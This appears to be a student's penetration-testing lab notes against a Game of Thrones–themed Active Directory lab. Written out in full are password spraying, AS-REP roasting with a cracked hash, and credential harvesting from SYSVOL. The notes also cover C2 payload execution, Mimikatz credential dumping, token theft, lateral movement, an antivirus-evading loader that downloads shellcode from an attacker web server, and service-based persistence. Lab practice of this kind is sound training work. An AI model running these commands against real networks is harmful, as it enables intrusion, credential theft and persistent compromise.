## Initial Network Scanning

##### Nmap Network Discovery
```sh
 nmap -sn 192.168.56.0/24
```
```text
192.168.56.10
00:0C:29:FF:C6:A6 (VMware)

192.168.56.11
00:0C:29:E2:FF:A8 (VMware)

192.168.56.12
00:0C:29:5E:85:50 (VMware)

192.168.56.22
00:0C:29:BA:E9:F0 (VMware)

192.168.56.23
00:0C:29:97:7D:F3 (VMware)
```

### enum4linux on 192.168.56.11
```
enum4linux 192.168.56.11
```
### User List
```text
Guest
arya.stark
sansa.stark
brandon.stark
rickon.stark
hodor
jon.snow
samwell.tarly
jeor.mormont
sql_svc
```
### Password list
```
Heartsbane
```

### Test Found Password
```
crackmapexec smb 192.168.56.[X] -u userlist -p passwordlist --ufail-limit 2 --continue-on-success
```
![](../../../../zzAttachments/Pasted%20image%2020250805112639.png)![](../../../../zzAttachments/Pasted%20image%2020250805112804.png)

### Check share permissions
- samwell.tarly:Heartsbane
```
smb://192.168.56.22/
```
- "all" share
![](../../../../zzAttachments/Pasted%20image%2020250814090833.png)

##### Add to password list
```
arya.stark:Needle
```

### Test Found User:Password
```
crackmapexec smb 192.168.56.[X] -u arya.stark -p Needle --ufail-limit 1 --continue-on-success
```
![](../../../../zzAttachments/Pasted%20image%2020250814091459.png)

### Test all users against password

##### create smb_ip_list because I'm tired of doing individual scans
```
192.168.56.10
192.168.56.11
192.168.56.12
192.168.56.22
192.168.56.23
```
```
crackmapexec smb smb_ip_list -u userlist -p passwordlist --ufail-limit 2 --continue-on-success
```
![](../../../../zzAttachments/Pasted%20image%2020250814093805.png)

### Test share permissions
##### Castleblack (192.168.56.22)
```
impacket-smbclient north.sevenkingdoms.local/arya.stark:Needle@192.168.56.22
```
![](../../../../zzAttachments/Pasted%20image%2020250814094404.png)
![](../../../../zzAttachments/Pasted%20image%2020250814094508.png)

##### Bravos (192.168.56.23)
```
impacket-smbclient essos.local/arya.stark:Needle@192.168.56.23
```
![](../../../../zzAttachments/Pasted%20image%2020250814094709.png)
![](../../../../zzAttachments/Pasted%20image%2020250814094754.png)

### AS-REP Roast Attempt
- samwell.tarly
- arya.stark
![](../../../../zzAttachments/Pasted%20image%2020250814101800.png)
![](../../../../zzAttachments/Pasted%20image%2020250814103103.png)
##### brandon.stark
```
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:cc98e5c87cb8ded44a9bf1666da48a9f$d086be98e811db260079b049f92b03e128d92dcb58d3b1440b38f7f7a4d7da76b97e2192124d5b8791626b8b3e6a480b8205f4743cb28021045b90ff4462e68effee93d049cbc7c1408b7101b5477a3d7397a2d08fbdee4d1c1a0ee83f796918e62c6db26b55b491238becd947fdec8e37a0710d6219f22f4715581c3ff6987a4c65d3cfaac1952b503799248c3227a87c1c7e373c1d23c19ccfcc373b5d8e98c0c5578c5f436a4c3133b1aad9d65790425bd83a423d62f78688fe644aec1f1fe9992c949dba2323a79106f082a96d01185ce35cbedddf62afb7cc9f9bc06a18a627c62bdce7b844f6661bf3f6fc156feec8f9f9a9edd76eef6fe80604c8e9ef6f002165ce2a
```

##### Offline Crack Attempt
```
hashcat -m 18200 brandon.stark.hash /usr/share/wordlists/rockyou.txt
```
![](../../../../zzAttachments/Pasted%20image%2020250814103228.png)
```
brandon.stark:iseedeadpeople
```
### Test brandon.stark access/permissions
```
crackmapexec smb smb_ip_list -u brandon.stark -p iseedeadpeople --continue-on-success
```
![](../../../../zzAttachments/Pasted%20image%2020250814103518.png)

##### Winterfell (192.168.56.11)
- impacket-smbclient doesn't allow recursive downloading so using smbclient is easier to get the folder in the sysvol share

```
impacket-smbclient north.sevenkingdoms.local/brandon.stark:iseedeadpeople@192.168.56.11
```
![](../../../../zzAttachments/Pasted%20image%2020250814105832.png)

```
smbclient -U brandon.stark //192.168.56.11/sysvol -c 'prompt OFF;recurse ON;mget *'
```
![](../../../../zzAttachments/Pasted%20image%2020250814105516.png)
##### castelblack (192.168.56.22)
```
impacket-smbclient north.sevenkingdoms.local/brandon.stark:iseedeadpeople@192.168.56.22
```
![](../../../../zzAttachments/Pasted%20image%2020250814110156.png)

##### essos (192.168.56.23)
```
impacket-smbclient essos.local/brandon.stark:iseedeadpeople@192.168.56.23
```
![](../../../../zzAttachments/Pasted%20image%2020250814110316.png)

### Review documents from sysvol/netlogon share

##### script.ps1
![](../../../../zzAttachments/Pasted%20image%2020250814110521.png)
```
jeor.mormont:_L0ngCl@w_
```

##### secret.ps1
![](../../../../zzAttachments/Pasted%20image%2020250814111106.png)
- not a simple b64 decode

#### sysvol files
![](../../../../zzAttachments/Pasted%20image%2020250814111240.png)
- some information but i'm not positive it can be used outside of learning the password policies.
- I need to look into what exactly the change wallpaper part does or if there is some way to use that.

### Test jeor.mormont access/permissions
```
crackmapexec smb smb_ip_list -u jeor.mormont -p _L0ngCl@w_ --continue-on-success
```
![](../../../../zzAttachments/Pasted%20image%2020250814112711.png)

##### castleblack (192.168.56.22)
```

```
![](../../../../zzAttachments/Pasted%20image%2020250814113000.png)
- uh ohhhhh
![](../../../../zzAttachments/Pasted%20image%2020250814113750.png)
- "8082.asp" I uploaded as a test. Uploaded payload 8082.exe to try execution

### Setup Sliver for Callback

##### Create Listeners
![](../../../../zzAttachments/Pasted%20image%2020250820081700.png)
![](../../../../zzAttachments/Pasted%20image%2020250820081813.png)

##### Create Payload
![](../../../../zzAttachments/Pasted%20image%2020250820081911.png)

### Castelblack payload execution
```
impacket-smbexec north.sevenkingdoms.local/jeor.mormont:_L0ngCl@w_@192.168.56.22 -shell-type powershell
```
##### copy payload to system32
```
copy c:\inetpub\wwwroot\upload\https-8082.exe c:\windows\system32
```
##### Execute payload
```
https-8082.exe
```

##### Verify Callback
![](../../../../zzAttachments/Pasted%20image%2020250820082209.png)

### Havoc Enumeration
```
whoami
```
```
ipconfig
```
```
sc_enum
```

### Dump Hashes

##### Upload mimikatz to target
```
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

##### run mimikatz
```
shell mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit
```
![](../../../../zzAttachments/Pasted%20image%2020250902094030.png)
### Impersonate Robb.Stark and Pivot
```
token find
```
![](../../../../zzAttachments/Pasted%20image%2020250820093155.png)
```
token steal 820 878
```

##### Enumerate Access
```
dir \\192.168.56.11\c$
```
![](../../../../zzAttachments/Pasted%20image%2020250820093607.png)

```
dir \\192.168.56.11\Admin$
```
![](../../../../zzAttachments/Pasted%20image%2020250820093633.png)

### Lateral Movement to 192.168.56.11

##### Upload payload
```
upload /home/kali/https-8082.exe \\192.168.56.11\Admin$\https-8082.exe
```
![](../../../../zzAttachments/Pasted%20image%2020250821100134.png)

##### Verify the payload is there
```
dir \\192.168.56.11\Admin$\h*
```
![](../../../../zzAttachments/Pasted%20image%2020250821100840.png)
- It isn't, it's deleted after about 15 seconds
- did the same steps with a text file and it works, which means defender probably caught and deleted it.

### Create a new payload to bypass A/V

##### Generate shellcode
![](../../../../zzAttachments/Pasted%20image%2020250902081907.png)

##### Create/Find a loader
- found on the web, not mine
![](../../../../zzAttachments/Pasted%20image%2020250902082820.png)

##### modify the loader
- found on the web, not mine
- for this loader "port" is for a python webserver, not the havoc listener
![](../../../../zzAttachments/Pasted%20image%2020250902081253.png)


##### Compile the payload
- found on the web, not mine
```
x86_64-w64-mingw32-g++ --static havoc-loader.cpp -o havoc.exe -lwinhttp -fpermissive 
```
![](../../../../zzAttachments/Pasted%20image%2020250902083210.png)

##### Start a python webserver using the "port" in the loader code
```
python3 -m http.server 8081
```

##### Simulate a user clicking the payload or use robb.stark's token
![](../../../../zzAttachments/Pasted%20image%2020250902083247.png)

### Create a service using robb.stark's token

##### Get the token
```
token find
```
```
token steal [PID] [HANDLE]
```

##### Upload the payload
```
cd \\192.168.56.11\admin$
```
```
upload [Path/To/Payload]/[PAYLOAD_NAME.EXE]
```
![](../../../../zzAttachments/Pasted%20image%2020250902084933.png)

##### Create the service
```
sc_create havoc havoc c:\Windows\havoc.exe havoc 0 2 3 192.168.56.11
```
![](../../../../zzAttachments/Pasted%20image%2020250902104446.png)

##### Reboot the system to verify it works
![](../../../../zzAttachments/Pasted%20image%2020250902104626.png)

##### The service will fail
- you can restart it with sc_start
- the payload isn't made for a service and will fail eventually
```
sc_start havoc 192.168.56.11
```

##### Fix it or do it the wrong way
- Here is the wrong way. (I'm running out of time but I'll revisit this and make the right payload)
- You have about 30 seconds before the service fails.
- run the havoc executable before you lose the callback.
```
shell c:\Windows\havoc.exe
```

### Own the Winterfell DC

